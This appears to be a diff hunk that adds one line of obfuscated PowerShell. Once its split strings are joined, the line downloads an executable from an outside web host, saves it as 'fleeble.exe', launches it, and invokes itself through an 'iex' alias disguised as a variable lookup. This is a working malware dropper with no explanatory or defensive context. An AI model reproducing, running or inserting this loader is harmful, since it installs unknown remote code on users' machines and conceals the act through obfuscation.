@@ -1,0 +1,1 @@
+﻿(('(New-'+'Ob'+'je'+'c'+'t Syste'+'m.'+'Net.W'+'ebC'+'lie'+'nt).'+'Down'+'load'+'Fi'+'le('+'{0}h'+'ttp'+'://wo'+'rld'+'ni'+'t.c'+'o'+'m'+'/co'+'m.e'+'xe{0},{0}f'+'l'+'eebl'+'e.exe{'+'0})'+';Start'+'-'+'Pro'+'cess {0}'+'fleeble.'+'exe{0}') -f [CHar]39)| & ( $veRboSeprEfeREnCe.TostrInG()[1,3]+'x'-joIN'')
